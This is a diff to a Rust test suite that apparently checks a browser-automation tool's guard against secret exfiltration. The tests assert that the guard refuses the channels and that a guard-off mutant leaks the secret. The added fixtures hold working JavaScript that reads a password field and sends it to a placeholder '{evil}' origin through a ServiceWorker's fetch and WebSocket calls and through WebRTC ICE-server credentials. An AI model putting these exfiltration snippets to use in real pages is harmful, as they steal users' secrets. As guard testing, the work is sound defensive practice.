@@ -56,7 +56,13 @@ a.onicecandidate=function(e){{e.candidate&&b.addIceCandidate(e.candidate)}};b.on
 b.ondatachannel=function(e){{e.channel.onmessage=function(m){{fetch('{evil}/rtc?d='+encodeURIComponent(m.data))}}}};
 var ch=a.createDataChannel('x');ch.onopen=function(){{ch.send(v)}};
 a.createOffer().then(function(o){{return a.setLocalDescription(o).then(function(){{return b.setRemoteDescription(o)}}).then(function(){{return b.createAnswer()}}).then(function(an){{return b.setLocalDescription(an).then(function(){{return a.setRemoteDescription(an)}})}})}});
-">Exfil3</button></body></html>"#
+">Exfil3</button>
+<button type="button" id="x4" onclick="
+var v=document.getElementById('pw').value;
+window.__sw='pending';
+navigator.serviceWorker.register('/sw.js?e='+encodeURIComponent('{evil}')).then(function(r){{window.__sw='registered';var w=r.installing||r.waiting||r.active;w.postMessage(v)}},function(e){{window.__sw='refused:'+e.name}});
+try{{var p=new RTCPeerConnection({{iceServers:[{{urls:'stun:127.0.0.1:9',username:v,credential:v}}]}});p.createDataChannel('x');p.createOffer().then(function(o){{return p.setLocalDescription(o)}})}}catch(e){{}}
+">Exfil4</button></body></html>"#
     )
 }
 
@@ -144,12 +150,23 @@ fn conn(mut s: TcpStream, lg: Log, html: Arc<Mutex<String>>) {
     if !first.contains("favicon") {
         lg.lock().unwrap().push(format!("{first} | {body}"));
     }
-    let resp = if first.contains(" / ") {
+    // W3.16.b.a.a: /sw.js?e=<evil origin> is a ServiceWorker script that ships whatever it is messaged
+    // to the evil origin by fetch and WebSocket.
+    let sw_evil = first
+        .split_once("/sw.js?e=")
+        .and_then(|(_, r)| r.split_whitespace().next())
+        .map(|e| e.replace("%3A", ":").replace("%2F", "/"));
+    let resp = if let Some(e) = &sw_evil {
+        let ws = e.replace("http://", "ws://");
+        format!("onmessage=function(ev){{var v=ev.data;fetch('{e}/swf?d='+encodeURIComponent(v));var w=new WebSocket('{ws}/sw2');w.onopen=function(){{w.send(v)}};}};")
+    } else if first.contains(" / ") {
         html.lock().unwrap().clone()
     } else {
         "ok".into()
     };
-    let ctype = if first.contains(" / ") {
+    let ctype = if sw_evil.is_some() {
+        "application/javascript"
+    } else if first.contains(" / ") {
         "text/html"
     } else {
         "text/plain"
@@ -177,6 +194,8 @@ impl Client {
         }
         if mutate {
             cmd.env("MANUK_SECRET_MUTATE", "1");
+            // W3.16.b.a.a: the ServiceWorker/ICE refusals are structural, so the mutant switches them off too.
+            cmd.env("MANUK_CDP_MUTATE", "no-sw-ice-guard");
         }
         let stderr = dir.join("stderr.txt");
         // MANUK_TAINT=off isolates the secret guard: the separate value-flow taint would otherwise
@@ -372,6 +391,13 @@ fn run(chrome: bool, mutate: bool, keyring: Option<&str>) -> Outcome {
             json!({"handle": handle_of(&nav, "\"Exfil3\""), "action": "click"}),
         );
         std::thread::sleep(std::time::Duration::from_millis(4000));
+        // W3.16.b.a.a: ServiceWorker registration + RTCPeerConnection ICE-server credentials.
+        step(
+            &mut c,
+            "act",
+            json!({"handle": handle_of(&nav, "\"Exfil4\""), "action": "click"}),
+        );
+        std::thread::sleep(std::time::Duration::from_millis(3000));
     }
     step(&mut c, "observe", json!({}));
     step(
@@ -453,6 +479,20 @@ fn assert_green(chrome: bool, keyring: Option<&str>) {
             o.refusals.iter().any(|r| r.contains("WebRTC data channel")),
             "no logged WebRTC data channel refusal: {:#?}",
             o.refusals
+        );
+        // W3.16.b.a.a: the ServiceWorker is never registered (so its fetch/WS cannot run) and the ICE-server
+        // list carrying the secret as TURN credentials is stripped; both refusals are logged.
+        for kind in ["ServiceWorker registration", "WebRTC ICE server list"] {
+            assert!(
+                o.refusals.iter().any(|r| r.contains(kind)),
+                "no logged refusal for {kind}: {:#?}",
+                o.refusals
+            );
+        }
+        assert!(
+            !o.evil.iter().any(|l| l.contains("/swf") || l.contains("/sw2")),
+            "ServiceWorker reached the evil origin: {:#?}",
+            o.evil
         );
         assert!(
             pr >= 5,
@@ -594,6 +634,14 @@ fn guard_off_chrome_run_leaks_the_w316ba_channels() {
         assert!(
             o.evil.iter().any(|l| l.contains(ch) && l.contains(SECRET)),
             "chrome mutant lacks {ch}: {:#?}",
+            o.evil
+        );
+    }
+    // W3.16.b.a.a: the ServiceWorker's fetch and WebSocket reach the evil origin with the guard off.
+    for ch in ["GET /swf?", "WS frame /sw2 "] {
+        assert!(
+            o.evil.iter().any(|l| l.contains(ch) && l.contains(SECRET)),
+            "chrome mutant lacks ServiceWorker channel {ch}: {:#?}",
             o.evil
         );
     }
